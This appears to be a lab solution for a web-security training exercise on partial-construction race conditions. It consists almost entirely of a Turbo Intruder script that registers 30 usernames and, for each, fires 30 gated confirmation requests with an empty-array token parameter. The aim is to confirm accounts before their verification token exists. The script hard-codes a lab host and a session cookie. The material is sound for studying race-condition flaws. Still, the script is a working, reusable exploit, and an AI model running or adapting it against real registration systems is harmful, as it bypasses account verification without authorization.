# LAB: Partial construction race conditions
## Turbo Intruder script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    confirm_request = """POST /confirm?token[]= HTTP/2
Host: 0aa500b4040a140a865f72b400010014.web-security-academy.net
Cookie: phpsessionid=gbADKRSV54MbYzmsEtgQGNhlgNRaWaop

"""
    for i in range(30):
        username = 'test_user' + str(i)
        engine.queue(target.req, username, gate=username)
        for i in range(30):
            engine.queue(confirm_request, gate=username)

        engine.openGate(username)

def handleResponse(req, interesting):
    table.add(req)
